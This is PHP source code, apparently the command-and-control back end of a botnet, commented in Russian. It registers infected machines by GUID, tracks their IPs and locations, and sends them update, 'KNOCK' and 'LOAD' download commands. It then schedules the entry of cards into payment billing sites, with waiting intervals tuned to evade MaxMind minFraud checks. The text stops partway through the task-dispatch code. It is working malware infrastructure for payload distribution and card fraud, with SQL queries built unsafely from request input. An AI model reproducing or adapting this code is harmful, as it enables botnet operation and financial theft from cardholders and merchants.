<?php

include "config.php";
include "bt_update_stuff.php";

require_once "geoip/index.php";
require_once 'mod_crypt.php';
require_once 'mod_bots.php';
require_once 'mod_file.php';
require_once 'mod_time.php';
require_once 'mod_dbase.php';

Error_Reporting (E_ERROR | E_PARSE);

function getip(&$ip, &$inip) {
	$ip = $inip = $_SERVER ["REMOTE_ADDR"];
	if (isset ($_SERVER ["HTTP_X_FORWARDED_FOR"])) {
		if (isset ($_SERVER ["HTTP_X_REAL_IP"]))
			$inip = $_SERVER ["HTTP_X_REAL_IP"];
		else
			$inip = $_SERVER ["HTTP_X_FORWARDED_FOR"];
	}
}

function free_sem ($sem_id) {
	if (!function_exists('sem_release'))
		return;
	if (!sem_release($sem_id)) {
		//writelog("error.log", "sem_release(\"$sem_id\") fails!");
	}
	if (!sem_remove($sem_id)) {
		//writelog("error.log", "sem_remove(\"$sem_id\") fails!");
	}
}
	
function CheckForRep($dbase, $id_bot, $GlobalTaskForRep) {
	$bot_rep = $_GET['rep'];
	if (@($bot_rep)) {
		$cdate = gmdate('Y.m.d H:i:s');
		if ($GlobalTaskForRep == NULL)
			$GlobalTaskForRep = 'NULL';
		
		$sql = " INSERT "
			 . "	INTO bots_rep_t"
			 . " VALUES (NULL, $id_bot, '$bot_rep', '$cdate', $GlobalTaskForRep)";
		//echo $sql;
		$res = mysqli_query($dbase, $sql);
	}
}

function bot_setonline(&$dbase, $bot_ver, $os_bot, $ie_bot, $usertp_bot, $id_bot) {
	if ( ($os_bot != '?') && ($ie_bot != '?') && ($usertp_bot != '?') )
		$qp = ", os_version_bot = '$os_bot', ie_version_bot = '$ie_bot', user_type_bot = '$usertp_bot'";
	$sql = "UPDATE bots_t "
		 . "   SET date_last_online_bot = now(), status_bot = 'online', ver_bot = '$bot_ver'$qp" 
		 . " WHERE id_bot = $id_bot";
	mysqli_query($dbase, $sql);
		
	/* if (mysqli_affected_rows($dbase) != 1) {
		writelog("error.log", "Wrong query : \" $sql \"");
		// (!) need to use free_sem() func.
		mysqli_rollback($dbase);
		db_close($dbase);
		return false;
	} */
	return true;
}

function bot_setlastrun($dbase, $id_bot) {
	$sql = "UPDATE bots_t "
		 . "   SET date_last_run_bot = now()"
		 . " WHERE id_bot = $id_bot";
	$res = mysqli_query($dbase, $sql);
	
	return true;
}

$isActive = false;
	
function process() {

$guid = $_GET['guid'];	
if ($guid) {
		
	$bot_ver = $_GET['ver'];
	$stat_bot = strtolower($_GET['stat']);
	$os_bot = $_GET['os'];
	$ie_bot = $_GET['ie'];
	$usertp_bot = $_GET['ut'];
	$cpu = $_GET['cpu'];
	
	if (!@$os_bot) $os_bot = "?";
	if (!@$ie_bot) $ie_bot = "?";
	if (!@$usertp_bot) $usertp_bot = "?";
	if (!@$cpu) $cpu = 0;
	else $cpu = intval($cpu);
	 
	// DB Connect
	$dbase = db_open();
	
	// Выбор бота по GUID'у
	$sql = "SELECT * "
		 . "	FROM bots_t "
		 . " WHERE guid_bot = '$guid' "
		 . " LIMIT 1";
	$main_res = mysqli_query($dbase, $sql);
		
	// Известно ли нам что-либо о месторасположении бота, если бот есть в базе?
	$geoip_update = FALSE;
	if (@$main_res && mysqli_num_rows($main_res)) {
		// Запоминаем id бота
		$mres = mysqli_fetch_array($main_res);
		$id_bot = $mres['id_bot'];
		$blocked = $mres['blocked'];
	 
		// Делаем стафф
		$sql = "SELECT *"
			 . "	FROM bots_t, city_t, country_t"
			 . " WHERE bots_t.id_bot = $id_bot"
			 . "	 AND bots_t.fk_city_bot = city_t.id_city"
			 . "	 AND city_t.fk_country_city = country_t.id_country"
			 . " LIMIT 1";
		
		$res = mysqli_query($dbase, $sql);
		if (!@$res) {
			writelog("error.log", "Wrong query : \" $sql \"");
			db_close($dbase);
			return 0;
		}
		if (!mysqli_num_rows($res)) {
			$geoip_update = TRUE;
		}
		else {
			// Подошло ли время обновить инфу о geo-ip расположении бота?
			$icfg = parse_ini_file('config.ini');
			$geoip_uci = $icfg['GEOIP_UPDATE_CHECK_INTERVAL'];
			if (strlen($geoip_uci) != 19) {
				$geoip_uci = '1970-01-07 00:00:00';
				writelog('error.log', 'Cannot read GEOIP_UPDATE_CHECK_INTERVAL from config. Using defaults week interval');
			}
			
			$mres = mysqli_fetch_array($res);
			$bot_lgcb = $mres['date_last_geoip_check_bot'];
	
			if ( (GetTimeStamp($bot_lgcb) + GetTimeStamp($geoip_uci)) < strtotime(gmdate("r")) ) {
				$geoip_update = TRUE;
				writelog('debug.log', "Gonna update date_last_geoip_check_bot for current bot ($id_bot)");
			}
		}
	}
	
	// Смотрим - есть ли такой бот? Надо ли нам про'update'ить geoip-положение?
	if ( (!(@($main_res)) || mysqli_num_rows($main_res) == 0) || $geoip_update === TRUE) {
		// Мониторя GEOIP-положение исходим из внутреннего IP бота
		getip($ip, $inip);
		$spaces = _get_spaces_of_IP($inip);
		
		// Есть ли в базе страна бота?		
		! ($spaces -> country_name) ? $country_name = 'Unknown' : $country_name = str_replace('\'', '\'\'', $spaces -> country_name);
		
		if ($country_name == 'Unknown') {
			writelog('error.log', "Cannot find country name for bot ($id_bot) with ip : $inip");
		}
		
		$sql = "SELECT * "
			 . "  FROM country_t "
			 . " WHERE name_country LIKE '$country_name' "
			 . " LIMIT 1";				
		$cn = mysqli_query($dbase, $sql);
		
		// Страны бота нет
		if (!(@($cn)) || mysqli_num_rows($cn) == 0) {
			$sql = " INSERT "
				 . "   INTO country_t "
				 . " VALUES (null, '$country_name')";
			$res = mysqli_query($dbase, $sql);
			$id_cn = mysqli_insert_id($dbase);							 
			if ($id_cn == 0) {
				writelog("error.log", "Wrong query : \" $sql \"");
				db_close($dbase);
				return 0;
			}
			
			// Город бота тоже - вставляем сразу
			( (! ($spaces -> city) ) ) || ( !strlen(trim($spaces -> city)) ) ? $city = 'Unknown' : $city = str_replace('\'', '\'\'', $spaces -> city);
			( (! ($spaces -> region) ) ) || ( !strlen(trim($spaces -> region)) ) ? $region = 'Unknown' : $region = str_replace('\'', '\'\'', $spaces -> region);
			
			if ($region == 'Unknown') {
				writelog('error.log', "Cannot find region name for bot ($id_bot) with ip : $inip");
			}
						
			$sql = " INSERT "
				 . "   INTO city_t "
				 . " VALUES (null, '$city', '$region', $id_cn)";
			$res = mysqli_query($dbase, $sql);
			$id_city = mysqli_insert_id($dbase);
			if ($id_city === 0) {
				writelog("error.log", "Wrong query : \" $sql \"");
				mysqli_rollback($dbase);
				db_close($dbase);
				return 0;
			}
		}
		// Страна бота есть
		else {
			$mres = mysqli_fetch_array($cn);
			$id_cn = $mres['id_country'];
			( (! ($spaces -> city) ) ) || ( !strlen(trim($spaces -> city)) ) ? $city = 'Unknown' : $city = str_replace('\'', '\'\'', $spaces -> city);
			( (! ($spaces -> region) ) ) || ( !strlen(trim($spaces -> region)) ) ? $region = 'Unknown' : $region = str_replace('\'', '\'\'', $spaces -> region);
			
			if ($region == 'Unknown') {
				writelog('error.log', "Cannot find region name for bot ($id_bot) with ip : $inip");
			}
			
			// Есть ли город бота в базе? (Штат тоже учитываем, ибо одинаковые названия городов могут быть в разных штатах)
			$sql = "SELECT id_city"
				 . "  FROM city_t"
				 . " WHERE name_city LIKE '$city'"
				 . "   AND state LIKE '$region'"
				 . " LIMIT 1";
			$res = mysqli_query($dbase, $sql);
			
			// Город бота есть
			if ((@($res)) && mysqli_num_rows($res) > 0) {
				$mres = mysqli_fetch_array($res);
				$id_city = $mres['id_city'];
			}
			// Города бота нет
			else {
				$sql = " INSERT "
					 . "   INTO city_t "
					 . " VALUES (null, '$city', '$region', $id_cn)";
				$res = mysqli_query($dbase, $sql);
				$id_city = mysqli_insert_id($dbase);
				if ($id_city == 0) {
					writelog("error.log", "Wrong query : \" $sql \"");
					db_close($dbase);
					return 0;
				}

			}
		}
		
		// Update местонахождения бота
		if ($geoip_update) {
			$sql = "UPDATE bots_t"
				 . "   SET fk_city_bot = $id_city, date_last_geoip_check_bot = '" . gmdate('Y.m.d H:i:s') . "'"
				 . " WHERE id_bot = $id_bot"
				 . " LIMIT 1";
			$res = mysqli_query($dbase, $sql);
			if (mysqli_affected_rows($dbase) != 1) {
				writelog("error.log", "Wrong query : \" $sql \"");
				db_close($dbase);
				return 0;
			}
		}
		// Вставка нового бота в базу
		else {
			$sql = " INSERT "
				 . "   INTO bots_t "
				 . " VALUES (null, '$guid', '$bot_ver', '$stat_bot', '0', $id_city, NULL, NULL, '$os_bot', '$ie_bot', '$usertp_bot', NULL, NULL)";
			$res = mysqli_query($dbase, $sql);

			$id_bot = mysqli_insert_id($dbase);
			if ($id_bot == 0) {
				writelog("error.log", "Wrong query : \" $sql \"");
				mysqli_rollback($dbase);
				db_close($dbase);
				return 0;
			}
		}
	}

	$GlobalTaskForRep = NULL;
	
	// Update'им статус бота на online и проставляем стафф
	bot_setonline($dbase, $bot_ver, $os_bot, $ie_bot, $usertp_bot, $id_bot);
		
	// Даём команду на update, если версия бота устарела
	if ( (intval($bot_ver) < LAST_VERSION_BOT) ) {
		writelog("debug.log", "UPDATE for bot \"$guid\" : bot_ver = $bot_ver : LAST_VERSION_BOT = " . LAST_VERSION_BOT);
		echo "UPDATE<br>PATH=" . UPDATE_PATH;
		global $isActive; $isActive = true;
		CheckForRep($dbase, $id_bot, $GlobalTaskForRep);
		db_close($dbase);
		return 0;
	}
	
	// Читаем CRC из конфига и сравниваем с тем, что прислал бот
	// Если CRC разные, значит даём боту команду на обновление конфига
	$ccrc = $_GET['ccrc'];
	if (!@$ccrc) {
		writelog("error.log", "CCRC parameter is not found! : bot \"$guid\"");
	}	
	else {
		$handle  = fopen(CONFIG_FILE, 'rb');
		if (!$handle) {
			writelog("error.log", "Cannot open CONFIG_FILE = \"" . CONFIG_FILE . "\"");
		}
		else {
			$filesize = filesize(CONFIG_FILE);
			$contents = fread($handle, $filesize);
			fclose($handle);
			$crc32 = substr($contents, $filesize - 4, 4);
			function ascii2hex($ascii) {
				$hex = '';
				for ($i = 0; $i < strlen($ascii); $i++) {
					$byte = strtoupper(dechex(ord($ascii{$i})));
					$byte = str_repeat('0', 2 - strlen($byte)) . $byte;
					$hex .= $byte;
				}
				return $hex;
			}
			$crc32i = ascii2hex($crc32);
			$crc32 = substr($crc32i, 6, 2) . substr($crc32i, 4, 2) . substr($crc32i, 2, 2) . substr($crc32i, 0, 2);
			if ( strcmp($crc32, $ccrc) != 0 && strlen($ccrc) == 8 && strcmp($ccrc, '00000000') != 0 ) {
				writelog("debug.log", "UPDATE_CONFIG for bot \"$guid\" : crc32 = $crc32 : ccrc = $ccrc");
				echo "UPDATE_CONFIG<br>PATH=" . UPDATE_CONFIG_PATH;
				global $isActive; $isActive = true;
				CheckForRep($dbase, $id_bot, $GlobalTaskForRep);
				db_close($dbase);
				return 0;
			}
		}
	}

	// Запоминаем IP бота, добавляя его IP в спец. таблицу
	getip($ip, $inip);
	// Эти IP нам знакомы?
	$sql = "SELECT COUNT(*) FROM ip_t WHERE fk_bot = $id_bot AND ip = '$ip'";
	$res = mysqli_query($dbase, $sql);
	if ((@($res)) && mysqli_num_rows($res) != 0) {
		list($cnt1) = mysqli_fetch_row($res);
	}
	else {
		writelog("error.log", "Wrong query : \" $sql \"");
		db_close($dbase);
		return 0;
	}
	if ($ip != $inip) {
		$sql = "SELECT COUNT(*) FROM ip_t WHERE fk_bot = $id_bot AND ip = '$inip'";
		$res = mysqli_query($dbase, $sql);
		if ((@($res)) && mysqli_num_rows($res) != 0) {
			list($cnt2) = mysqli_fetch_row($res);
		}
		else {
			writelog("error.log", "Wrong query : \" $sql \"");
			db_close($dbase);
			return 0;
		}
	}
	else {
		$cnt2 = 1;
	}
	// "ip" is unknown
	if (!$cnt1) {
		$sql = "INSERT INTO ip_t (fk_bot, ip) VALUES ($id_bot, '$ip')";
		mysqli_query($dbase, $sql);
		if (mysqli_affected_rows($dbase) != 1) {
			writelog("error.log", "Wrong query : \" $sql \"");
			db_close($dbase);
			return 0;
		}
	}
	// "inip" is unknown
	if (!$cnt2) {
		$sql = "INSERT INTO ip_t (fk_bot, ip) VALUES ($id_bot, '$inip')";
		mysqli_query($dbase, $sql);
		if (mysqli_affected_rows($dbase) != 1) {
			writelog("error.log", "Wrong query : \" $sql \"");
			db_close($dbase);
			return 0;
		}
	}
	
	// 
	// Мутим действия в зависимости от статуса бота
	// 

	switch ($stat_bot) {
	
		// Когда бот активен
		
		case 'online':
			$start_time = microtime(1);
		
			// Удалось ли боту записать свой GUID на комп клиента?
			if (!strcmp($guid, "00000000-0000-0000-0000000000000000")) {
				writelog("error.log", "NULLed GUID");
				CheckForRep($dbase, $id_bot, $GlobalTaskForRep);
				db_close($dbase);
				return 0; 
			}
		
			// 
			// Есть ли задания по отстукам?
			// 
			$sql = "SELECT gtask_knock_t.knocklink, tasks_knock_t.id, tasks_knock_t.fk_gtask"
				 . "  FROM gtask_knock_t, tasks_knock_t"
				 . " WHERE gtask_knock_t.id = tasks_knock_t.fk_gtask"
				 . "   AND status = 0";
			$res = mysqli_query($dbase, $sql);
			if (!(@($res))) {
				writelog("error.log", "Wrong query : \" $sql \"");
				db_close($dbase);
				return 0;
			}
			while ( list($knocklink, $tid, $fk_gtask) = mysqli_fetch_row($res) ) {
				// Не выполнял ли бот это задание раньше?
				$sql = "SELECT COUNT(*) FROM tasks_knock_t WHERE fk_gtask = $fk_gtask AND fk_bot = $id_bot";
				$sres = mysqli_query($dbase, $sql);
				if (!(@($sres)) || !mysqli_num_rows($sres)) {
					writelog("error.log", "Wrong query : \" $sql \"");
					db_close($dbase);
					return 0;
				}
				list($cnt) = mysqli_fetch_row($sres);
				if ($cnt)
					continue;
					
				// Выдаём задание боту
					
				// Обновляем статус локального задания
				$sql = "UPDATE tasks_knock_t"
					 . "   SET fk_bot = $id_bot, status = 1"
					 . " WHERE id = $tid"
					 . " LIMIT 1";
				mysqli_query($dbase, $sql);
				if (mysqli_affected_rows($dbase) != 1) {
					writelog("error.log", "Wrong query : \" $sql \"");
					db_close($dbase);
					return 0;
				}
				// Посылаем боту команду
				$go = "KNOCK<br>$knocklink<br>$tid";
				echo $go;
					
				$finish_time = microtime(1);
				writelog("tasks.log", "KNOCK (" . ($finish_time - $start_time) . " sec.): \"" . $go . "\""); 
				global $isActive; $isActive = true;
				return 0;
			}
		
			//
			// Есть ли задания по загрузкам?
			// 
			
			// Есть ли невыполненные задания по загрузкам, которые не выдавались этому боту?
			$sql = "SELECT gtask_loader_t.loadlink, tasks_loader_t.id, tasks_loader_t.fk_gtask, gtask_loader_t.ipmasks"
				 . "  FROM gtask_loader_t, tasks_loader_t"
				 . " WHERE gtask_loader_t.id = tasks_loader_t.fk_gtask"
				 . "   AND status = 0";
			$res = mysqli_query($dbase, $sql);
			if (!(@($res))) {
				writelog("error.log", "Wrong query : \" $sql \"");
				db_close($dbase);
				return 0;
			}
			while ( list($loadlink, $tid, $fk_gtask, $ipmasks) = mysqli_fetch_row($res) ) {
				$match = preg_split("/\n/", $ipmasks);
				for ($i = 0; $i < count($match); $i++) {
					$ipmask = trim($match[$i]);
					$n1 = (strlen($ip) < strlen($ipmask)) ? strlen($ip) : strlen($ipmask);
					$n2 = (strlen($inip) < strlen($ipmask)) ? strlen($inip) : strlen($ipmask);
					// Подходит ли бот по IP?
					if (strncmp($ip, $ipmask, $n1) != 0 && strncmp($inip, $ipmask, $n2) != 0)
						continue;
					// Не выполнял ли бот это задание раньше?
					$sql = "SELECT COUNT(*) FROM tasks_loader_t WHERE fk_gtask = $fk_gtask AND fk_bot = $id_bot";
					$sres = mysqli_query($dbase, $sql);
					if (!(@($sres)) || !mysqli_num_rows($sres)) {
						writelog("error.log", "Wrong query : \" $sql \"");
						db_close($dbase);
						return 0;
					}
					list($cnt) = mysqli_fetch_row($sres);
					if ($cnt)
						continue;
					
					// Выдаём задание боту
					
					// Обновляем статус локального задания
					$sql = "UPDATE tasks_loader_t"
						 . "   SET fk_bot = $id_bot, status = 1"
						 . " WHERE id = $tid"
						 . " LIMIT 1";
					mysqli_query($dbase, $sql);
					if (mysqli_affected_rows($dbase) != 1) {
						writelog("error.log", "Wrong query : \" $sql \"");
						db_close($dbase);
						return 0;
					}
					// Посылаем боту команду
					$go = "LOAD<br>$loadlink<br>$tid";
					echo $go;
					
					$finish_time = microtime(1);
					writelog("tasks.log", "LOAD (" . ($finish_time - $start_time) . " sec.): \"" . $go . "\""); 
					global $isActive; $isActive = true;
					return 0;
				}
			}
			
			// 
			// Есть ли задания по вбивам?
			//
			
			// Заблокирован ли бот?
			if ($blocked) {
				CheckForRep($dbase, $id_bot, $GlobalTaskForRep);
				db_close($dbase);
				return 0; 
			}
			
			// Забанен ли бот по IP?
			$sql = "SELECT * FROM ip_ban_t";
			$res = mysqli_query($dbase, $sql);
			if (!(@($res))) {
				writelog("error.log", "Wrong query : \" $sql \"");
				db_close($dbase);
				return 0;
			}
			while ($mres = mysqli_fetch_array($res)) {
				$ip_ban = $mres['ip_ban'];
				$n = (strlen($ip) < strlen($ip_ban)) ? strlen($ip) : strlen($ip_ban);
				if (!strncmp($ip, $ip_ban, $n)) {
					writelog("debug.log", "Bot ($id_bot) is blocked. IP is banned ($ip) by mask \"$ip_ban\""); 
					db_close($dbase);
					return 0;
				}	
			}
			
			if (function_exists('sem_get'))
			{
				// Поскольку не исключена ситуация, когда может выдаться одна и та же карта даже в одно и то же задание, ...
				// мы вынуждены использовать семафор
				$SEMKEY = 0x100;
				$sem_id = sem_get($SEMKEY, 1);
				if ( $sem_id === false ) {
					writelog("error.log", "sem_get() fails!");
					db_close($dbase);
					exit;
				}
				if ( !sem_acquire($sem_id) ) {
					//writelog("error.log", "sem_acquire(\"$sem_id\") fails!");
					db_close($dbase);
					sem_remove($sem_id);
					exit;
				}
			}
			else
			{
				writelog("error.log", "function sem_get() does not exists!");
			}
			
			// Насколько сильно загружена машина бота?
			$icfg = parse_ini_file('config.ini');
			$maxcpu = $icfg['MAX_CPU_LOAD'];
			if ($cpu > $maxcpu && strlen($maxcpu) > 0) {
				writelog("error.log", "Biot with ID = $id_bot is too busy (CPU = $cpu %)");
				CheckForRep($dbase, $id_bot, $GlobalTaskForRep);
				free_sem($sem_id);
				db_close($dbase);
				return 0;
			}

			// Если в конфиге конкретно указан ID глобального задания, которое нужно выполнять, по делаем фильтр по этому ID
			$gtfilter = $icfg['GLOBAL_TASK_FILTER_ID'];
			(strlen($gtfilter) != 0) ? $sqlp = " AND id_global_task = $gtfilter" : $sqlp = '';
			
			// Есть ли задания, отправленные на RESTART?
			$sql = 'SELECT id_global_task, start_dtime_global_task, finish_dtime_global_task, check_cities, check_states, count_bots_global_task, fk_url, fk_ref_url, note, paused, id_dtime_run, dtime_run, fk_global_task_dtimes_run, fk_task_dtimes_run'
				 . ' FROM global_tasks_t, dtimes_run_t'
				 . ' LEFT JOIN dtimes_run_manual ON (dtimes_run_manual.fk_dtimes = dtimes_run_t.id_dtime_run)'
				 . ' WHERE fk_global_task_dtimes_run = id_global_task'
				 . ' AND ('
				 . ' ('
				 . '   (UNIX_TIMESTAMP( new_dtime_manual ) <= UNIX_TIMESTAMP( now( ) ))'
				 . '   AND dtimes_run_t.fk_task_dtimes_run IS NULL'
				 . '   AND global_tasks_t.paused = 0'
				 . ' )'
			// Есть ли невыданные задания? (временной критерий конца учитывается)
				. ' OR '
				. ' ('
				. '   UNIX_TIMESTAMP( start_dtime_global_task ) <= UNIX_TIMESTAMP( now( ) )'
				. '   AND UNIX_TIMESTAMP( dtime_run ) <= UNIX_TIMESTAMP( now( ) )'
				. '   AND (UNIX_TIMESTAMP( finish_dtime_global_task ) >= UNIX_TIMESTAMP( now( ) ))'
				. '   AND dtimes_run_t.fk_task_dtimes_run IS NULL'
				. '   AND dtimes_run_t.id_dtime_run NOT IN (SELECT dtimes_run_manual.fk_dtimes FROM dtimes_run_manual)'
				. '   AND global_tasks_t.paused = 0'
				. '	)'
				. '	    )'
				. $sqlp
				. ' LIMIT 0, 1000';
			$res = mysqli_query ($dbase, $sql);
			// Если таких заданий несколько, то выбираем какое-нибудь, рандомно
			$cnt = mysqli_num_rows($res);
			if ((@($res)) && $cnt > 1) {
				$rnd = rand(1, $cnt - 1);
				for ($i = 0; $i < $rnd; $i++) 
					$mres = mysqli_fetch_array($res);
			}
			else if ((!(@($res))) || !mysqli_num_rows($res)) {
				CheckForRep($dbase, $id_bot, $GlobalTaskForRep);
				free_sem($sem_id);
				db_close($dbase);
				return 0;
			}
			else
				$mres = mysqli_fetch_array($res);

			// Берём конфиг. глобального задания
			$id_gt = $mres['id_global_task'];
			$id_dtr = $mres['id_dtime_run'];
			$ChkCt = $mres['check_cities'];
			$ChkSt = $mres['check_states'];
			$fk_url = $mres['fk_url'];
			$fk_ref_url = $mres['fk_ref_url'];
				 
			//writelog("debug.log", "Processing global task #$id_gt and dtime_run #$id_dtr");
				 
			// Проверим - прошло ли хотя бы больше ~42 минут, чтобы вбивать карту в какой-либо биллинг
			// 
			// Получаем текстовую ссылку на текущий биллинг
			$sql = 'SELECT text_url_urls'
				 . ' FROM urls_t '
				 . " WHERE urls_t.id_url = " . $fk_url
				 . ' LIMIT 1';
			$res = mysqli_query ($dbase, $sql);
			if ((!(@($res))) || !mysqli_num_rows($res)) {
				CheckForRep($dbase, $id_bot, $GlobalTaskForRep);
				writelog("error.log", "Wrong query : \" $sql \"");
				free_sem($sem_id);
				db_close($dbase);
				return 0;
			}
			list($text_url) = mysqli_fetch_row($res);
			// Выдираем имя домена из текста ссылки
			preg_match_all('/(http|https):\/\/(www.|)([\d\w\.\-_]+)/i', $text_url, $parts);	
			$text_url_domain = $parts[3][0];
			if (!strlen($text_url_domain)) {
				CheckForRep($dbase, $id_bot, $GlobalTaskForRep);
				writelog("error.log", "smth wrong with domain-name of the billing : " . $sql);
				free_sem($sem_id);
				db_close($dbase);
				return 0;
			}
			// Получаем последнюю дату выполненного задания для текущего биллинга
			$sql = "SELECT MAX(tasks_t.begin_time_task)"
				 . "	FROM bots_t, tasks_t, dtimes_run_t, global_tasks_t, urls_t"
				 . " WHERE urls_t.text_url_urls LIKE '%$text_url_domain%'"
				 . "	 AND bots_t.id_bot = tasks_t.fk_bot_task"
				 . "	 AND tasks_t.id_task = dtimes_run_t.fk_task_dtimes_run"
				 . "	 AND dtimes_run_t.fk_global_task_dtimes_run = global_tasks_t.id_global_task"
				 . "	 AND global_tasks_t.fk_url = urls_t.id_url";
			$res = mysqli_query ($dbase, $sql); 
			if (!(@($res))) {
				CheckForRep($dbase, $id_bot, $GlobalTaskForRep);
				writelog("error.log", "Wrong query : \" $sql \"");
				free_sem($sem_id);
				db_close($dbase);
				return 0;
			}
			else if (mysqli_num_rows($res)) {
				list($date_max) = mysqli_fetch_row($res);
				if ($date_max) {
					// Проверяем - прошло ли больше ~42 минут с момента выдачи задания для текущего биллинга
					$mwt = $icfg['MIN_WAIT_TIME'];
					if (strlen($mwt) != 19) {
						$mwt = '1970-01-01 00:42:00';
						writelog('error.log', 'Cannot read MIN_WAIT_TIME from config. Using defaults 42-min pause');
					}
					if (GetTimeStamp($date_max) >= (strtotime(gmdate("r")) - GetTimeStamp($mwt))) {
						writelog("debug.log", "Bot ($id_bot) is blocked. To often takes for domain $text_url_domain ...");
						CheckForRep($dbase, $id_bot, $GlobalTaskForRep);
						free_sem($sem_id);
						db_close($dbase);
						return 0;			 
					}
				}
			}
				 
			$GlobalTaskForRep = $id_gt;
				 
			// Прошло ли достаточное количество времени, чтобы снова послать бота на задание?
			$wait_before_start = $icfg['WAIT_BEFORE_START'];
			if (strlen($wait_before_start) != 19) {
				$wait_before_start = '1970-04-01 00:00:00';
				writelog('error.log', 'Cannot read WAIT_BEFORE_START from config');
			}
			$ss_fs_interval = $icfg['SS_FS_INTERVAL'];
			if (strlen($ss_fs_interval) != 19) {
				$ss_fs_interval = '1970-02-01 00:00:00';
				writelog('error.log', 'Cannot read SS_FS_INTERVAL from config');
			}
			
			$sql = "SELECT id_bot"
				 . "  FROM bots_t"
				 . " WHERE id_bot = $id_bot"
				 . "   AND ("
				 . " UNIX_TIMESTAMP( date_last_run_bot ) >= ( UNIX_TIMESTAMP( now( ) ) - UNIX_TIMESTAMP('" . $wait_before_start . "') )"
				 . " )"
				 . " LIMIT 1";
			$res = mysqli_query($dbase, $sql);
			// ошибка происходит в лишь в том случае, если date_last_run_bot == NULL, т.е. бот ещё не выполнял никаких заданий
			if ((@($res)) && mysqli_num_rows($res) != 0) {
				$check_identical_bot_guid = $icfg['CHECK_IDENTICAL_BOT_GUID'];
				if (strlen($check_identical_bot_guid) != 1) {
					$check_identical_bot_guid = TRUE;
					writelog('error.log', 'Cannot read CHECK_IDENTICAL_BOT_GUID from config');
				}
				else {
					($check_identical_bot_guid == '0') ? $check_identical_bot_guid = FALSE : $check_identical_bot_guid = TRUE;
				}
				if ($check_identical_bot_guid) {
					//writelog("debug.log", "Bot ($id_bot). Blocked by CHECK_IDENTICAL_BOT_GUID ( \" $sql \" )");
					CheckForRep($dbase, $id_bot, $GlobalTaskForRep);
					free_sem($sem_id);
					db_close($dbase);
					return 0;	
				}
			
				// ОК! Действительно, бот выполнял какие-либо задания в течении WAIT_BEFORE_START, однако нужно проверить - выполнял ли он эти задания для текущего биллинга
				// Если выполнял, то да, действительно он нам не нужен
				// Однако, если не выполнял, то мы его можем использовать
				// P.S.: как выяснилось, некоторые биллинги начали использовать систему minFraud от MaxMind (например, SetSystems и FastSpring). Поэтому, нужно выдерживать длительную паузу (SS_FS_INTERVAL), перед тем, как послать бота на вбив биллинг A, при условии, что он уже выполнял вбив в биллинг B
						 
				// Для начала получим текстовую ссылку на текущий биллинг
				$sql = 'SELECT text_url_urls'
					 . '  FROM urls_t '
					 . " WHERE urls_t.id_url = " . $fk_url
					 . ' LIMIT 1';
				$res = mysqli_query ($dbase, $sql);
				if ((!(@($res))) || !mysqli_num_rows($res)) {
					CheckForRep($dbase, $id_bot, $GlobalTaskForRep);
					writelog("error.log", "Wrong query : \" $sql \"");
					free_sem($sem_id);
					db_close($dbase);
					return 0;
				}
				list($text_url) = mysqli_fetch_row($res);
				// Выдираем имя домена из текста ссылки
				preg_match_all('/(http|https):\/\/(www.|)([\d\w\.\-_]+)/i', $text_url, $parts);	
				$text_url_domain = $parts[3][0];
				if (!strlen($text_url_domain)) {
					CheckForRep($dbase, $id_bot, $GlobalTaskForRep);
					writelog("error.log", "smth wrong with domain-name of the billing : " . $sql);
					free_sem($sem_id);
					db_close($dbase);
					return 0;
				}
				
				// Получаем последнюю дату выполненного задания текущего бота для текущего биллинга
				$sql = "SELECT MAX(tasks_t.end_time_task)"
					 . "  FROM bots_t, tasks_t, dtimes_run_t, global_tasks_t, urls_t"
					 . " WHERE bots_t.id_bot = $id_bot"
					 . "   AND urls_t.text_url_urls LIKE '%$text_url_domain%'"
					 . "   AND bots_t.id_bot = tasks_t.fk_bot_task"
					 . "   AND tasks_t.id_task = dtimes_run_t.fk_task_dtimes_run"
					 . "   AND dtimes_run_t.fk_global_task_dtimes_run = global_tasks_t.id_global_task"
					 . "   AND global_tasks_t.fk_url = urls_t.id_url";
				$res = mysqli_query ($dbase, $sql);
				if (!(@($res))) {
					CheckForRep($dbase, $id_bot, $GlobalTaskForRep);
					writelog("error.log", "Wrong query : \" $sql \"");
					free_sem($sem_id);
					db_close($dbase);
					return 0;
				}
				else if (mysqli_num_rows($res)) {
					list($date_max) = mysqli_fetch_row($res);
					if ($date_max) {
						// Делаем вещь, аналогичную вышеприведённому sql-запросу
						// Т.е. если бот действительно раньше выполнял задание связанное с текущим биллингом, то проверяем - прошло ли достаточное кол-во времени, чтобы снова послать бота на задание
						if (GetTimeStamp($date_max) >= (strtotime(gmdate("r")) - GetTimeStamp($wait_before_start))) {
							//writelog("error.log", "Wrong query : \" $sql \"");
							CheckForRep($dbase, $id_bot, $GlobalTaskForRep);
							free_sem($sem_id);
							db_close($dbase);
							return 0;	
						}
						// если прошло времени больше, чем WAIT_BEFORE_START, то этому боту можно выдать задание
					}
				}
				
				// Теперь проверим - выдержан ли интервал времени между биллингами, использующими minFraud
				$billing = '';
				// Если текущий биллинг SetSystems, то выбираем последнюю дату выполненного задания для FastSpring
				if ($text_url_domain == 'setsystems.com') {
					$billing = 'fastspring.com';
				}
				// Если текущий биллинг FastSpring, то выбираем последнюю дату выполненного задания для SetSystems
				else if ($text_url_domain == 'fastspring.com') {
					$billing = 'setsystems.com';
				}
				if ($billing != '') {
					$sql = "SELECT MAX(tasks_t.end_time_task)"
						. "  FROM bots_t, tasks_t, dtimes_run_t, global_tasks_t, urls_t"
						. " WHERE bots_t.id_bot = $id_bot"
						. "   AND urls_t.text_url_urls LIKE '%$billing%'"
						. "   AND bots_t.id_bot = tasks_t.fk_bot_task"
						. "   AND tasks_t.id_task = dtimes_run_t.fk_task_dtimes_run"
						. "   AND dtimes_run_t.fk_global_task_dtimes_run = global_tasks_t.id_global_task"
						. "   AND global_tasks_t.fk_url = urls_t.id_url";
					$res = mysqli_query ($dbase, $sql);
					if (!(@($res))) {
						CheckForRep($dbase, $id_bot, $GlobalTaskForRep);
						writelog("error.log", "Wrong query : \" $sql \"");
						free_sem($sem_id);
						db_close($dbase);
						return 0;
					}
					else if (mysqli_num_rows($res)) {
						list($date_max) = mysqli_fetch_row($res);
						if ($date_max) {
							if (GetTimeStamp($date_max) >= (strtotime(gmdate("r")) - GetTimeStamp($ss_fs_interval))) {
								//writelog("error.log", "Wrong query : \" $sql \"");
								CheckForRep($dbase, $id_bot, $GlobalTaskForRep);
								free_sem($sem_id);
								db_close($dbase);
								return 0;	
							}
							// если прошло времени больше, чем SS_FS_INTERVAL, то этому боту можно выдать задание
						}
					}
				}
				
				// если таких записей нет, то этому боту можно выдать задание ...
			}
